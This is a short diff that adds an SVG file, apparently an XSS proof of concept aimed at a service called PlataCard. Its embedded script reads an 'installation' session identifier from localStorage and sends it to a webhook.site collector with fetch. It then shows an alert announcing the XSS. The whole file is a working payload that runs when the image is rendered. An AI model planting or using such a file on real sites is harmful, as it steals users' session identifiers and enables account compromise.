@@ -1,0 +1,8 @@
+ <svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+   // Capturamos el teléfono y el ID de sesión automáticamente
+           var id = localStorage.getItem("installation");
+           fetch("https://webhook.site/49d88147-75c7-46dd-9afa-5d4c1bd3acba?xss_id=" + id);
+          alert("XSS en PlataCard! ID de Sesión: " + id);
+   </script>
+      </svg>
